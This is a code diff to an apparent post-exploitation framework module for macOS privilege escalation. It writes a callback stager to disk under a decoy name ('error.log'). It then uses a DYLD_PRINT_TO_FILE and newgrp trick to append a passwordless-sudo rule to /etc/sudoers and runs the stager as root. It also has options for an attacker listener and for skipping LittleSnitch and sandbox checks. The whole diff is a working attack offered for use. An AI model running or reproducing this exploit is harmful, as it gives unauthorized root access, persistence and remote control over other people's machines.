@@ -33,6 +33,8 @@ class Module:
             # the minimum language version needed
             'MinLanguageVersion' : '2.6',
 
+	    'NeedsAdmin' : False,
+
             # list of any references/other comments
             'Comments': [
                 'References:',
@@ -50,33 +52,38 @@ class Module:
                 'Description'   :   'Agent used to Privesc from',
                 'Required'      :   True,
                 'Value'         :   ''
-        }
+       		},
             'FileName': {
             # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'The filename to use when the temporary file is dropped to disk.',
-                'Required'      :   False,
-                'Value'         :   ''.join(random.choice(string.lowercase) for i in range(5))
-        },
+                'Required'      :   True,
+                'Value'         :   'error.log'
+       		},
+            'Listener' : {
+                'Description'   :   'Listener to use.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
             'SafeChecks' : {
                 'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
-        },
+       		},
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-        },
+      		},
             'WriteablePath' : {
                 'Description'   :   'Full path to where the file should be written. Defaults to /tmp/.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/'
-        }
+      		}
+   	    }
 
         # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
+        #   like listeners/agent handlers/etc.	
+	self.mainMenu = mainMenu
         # During instantiation, any settable option parameters
         #   are passed as an object set to the module and the
         #   options dictionary is automatically set. This is mostly
@@ -96,48 +103,29 @@ class Module:
         #
         # the script should be stripped of comments, with a link to any
         #   original reference script included in the comments.
-        launcher = self.mainManu.stagers.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher += '\nrm -- "%0"'
-        fullPath = self.options[WriteablePath]['Value'] + self.options[FileName]['Value']
-        fileName = self.options[FileName]['Value']
-        
+	listenername = self.options['Listener']['Value']
+	userAgent = self.options['UserAgent']['Value']
+	safeChecks = self.options['SafeChecks']['Value']
+
+        launcher = self.mainMenu.stagers.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
+	if launcher == "":
+		print helpers.color("[!] Error in launcher generation")
+	launcher = launcher.replace("\"","\\\"")
+	fullPath = self.options['WriteablePath']['Value'] + self.options['FileName']['Value']
+        fileName = self.options['FileName']['Value']
         script = """
-		import os
-        print "Writing Stager to {filename}..."
-        file = open({filename},"w")
-        file.write({filecontents})
-        file.close()
-        print "Attempting to execute stager as root..."
-        try:
-		    os.system('/bin/sh -c "echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo {fullpath} &')
-            print "Successfully ran command, you should be getting an elevated stager"
-        except:
-            print "[!] Could not execute payload!"
+import os
+print "Writing Stager to {filename}..."
+file = open("{fullpath}","w")
+file.write("{filecontents}")
+file.close()
+print "Attempting to execute stager as root..."
+try:
+	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
+	print "Successfully ran command, you should be getting an elevated stager"
+except:
+	print "[!] Could not execute payload!"
             
-""" .format(fullpath=fullPath,filecontents=launcher, filename=fileName)
-        # if you're reading in a large, external script that might be updates,
-        #   use the pattern below
-        # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/..."
-        try:
-            f = open(moduleSource, 'r')
-        except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
-            return ""
-
-        moduleCode = f.read()
-        f.close()
-
-        script = moduleCode
-
-        # add any arguments to the end execution of the script
-        for option, values in self.options.iteritems():
-            if option.lower() != "agent":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value'])
+	""" .format(fullpath=fullPath,filecontents=launcher, filename=fileName)
 
         return script
